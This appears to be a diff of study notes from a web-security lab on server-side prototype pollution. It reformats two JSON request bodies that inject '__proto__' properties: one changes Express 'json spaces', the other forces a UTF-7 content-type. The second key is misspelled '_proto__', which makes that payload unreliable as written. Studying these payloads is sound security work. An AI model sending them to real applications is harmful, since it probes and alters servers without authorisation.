@@ -567,13 +567,33 @@ If it does, the header being processed is effectively dropped. Due to the way th
 - Solution by tweaking `json spaces`-:
 
 ```json
-{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"in1gBgf219ibnRiQgX2TWBVjrK808olK","__proto__":{"json spaces":3}}
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Wienerville",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "in1gBgf219ibnRiQgX2TWBVjrK808olK",
+  "__proto__": {
+    "json spaces": 3
+  }
+}
 ```
 
 - Tweaking body-parser:`content-type`
 
 ```json
-{"address_line_1":"+AEgAZQBsAGwAbwAgACgAIABXAG8AcgBsAGQAIQAg5L2g5aW9ACAA8J+Mjw-","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"ZH3bo0oZfag2nB6Una1u5xNt4qtS9bEo","_proto__":{"content-type":"application/json;charset=UTF-7"}}
+{
+  "address_line_1": "+AEgAZQBsAGwAbwAgACgAIABXAG8AcgBsAGQAIQAg5L2g5aW9ACAA8J+Mjw-",
+  "address_line_2": "One Wiener Way",
+  "city": "Wienerville",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "ZH3bo0oZfag2nB6Una1u5xNt4qtS9bEo",
+  "_proto__": {
+    "content-type": "application/json;charset=UTF-7"
+  }
+}
 ```
 
 
